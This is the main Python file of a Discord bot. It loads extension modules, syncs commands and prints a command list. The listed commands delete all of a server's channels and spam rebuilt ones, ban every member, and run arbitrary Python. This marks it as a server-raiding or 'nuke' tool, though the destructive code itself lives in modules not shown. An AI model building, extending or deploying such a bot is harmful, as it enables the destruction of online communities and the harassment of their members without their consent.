import os
import discord
from discord.ext import commands
import config

class MyBot(commands.Bot):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)

    async def setup_hook(self):
        # Determine the absolute path to the cogs folder
        current_dir = os.path.dirname(os.path.abspath(__file__))
        cogs_dir = os.path.join(current_dir, "cogs")
        
        # Dynamically load all python files inside cogs/ (except __init__.py)
        for filename in os.listdir(cogs_dir):
            if filename.endswith(".py") and filename != "__init__.py":
                cog_name = f"cogs.{filename[:-3]}"
                try:
                    await self.load_extension(cog_name)
                    print(f"Successfully loaded extension: {cog_name}")
                except Exception as e:
                    print(f"Failed to load extension {cog_name}: {e}")

        # Sync the application commands globally
        try:
            print("Syncing application commands globally...")
            synced = await self.tree.sync()
            print(f"Successfully synced {len(synced)} application commands globally.")
        except Exception as e:
            print(f"Failed to sync application commands: {e}")

# Define the intents needed for the bot
intents = discord.Intents.default()
intents.message_content = True  # Required to read commands
intents.guilds = True           # Required to fetch channel list
intents.members = True          # Required for mass ban to read full member list

# Initialize the Bot subclass with the prefix "nexus4all"
bot = MyBot(command_prefix="nexus4all", intents=intents)

@bot.event
async def on_ready():
    print("------")
    print(f"Logged in as: {bot.user} (ID: {bot.user.id})")
    print("Bot is ready. Commands:")
    print("  - nexus4all.tensor     (Delete all channels, rebuild, and spam)")
    print("  - nexus4all.nuke       (Delete all channels instantly)")
    print("  - nexus4all.massb      (Ban all bannable members)")
    print("  - nexus4all.stop       (Stop tensor/nuke mid-execution)")
    print("  - nexus4all.stopban    (Stop mass ban mid-execution)")
    print("  - nexus4all.eval       (Execute Python code - Owner Only)")
    print("------")

# Run the bot using the token in config.py
bot.run(config.BOT_TOKEN)
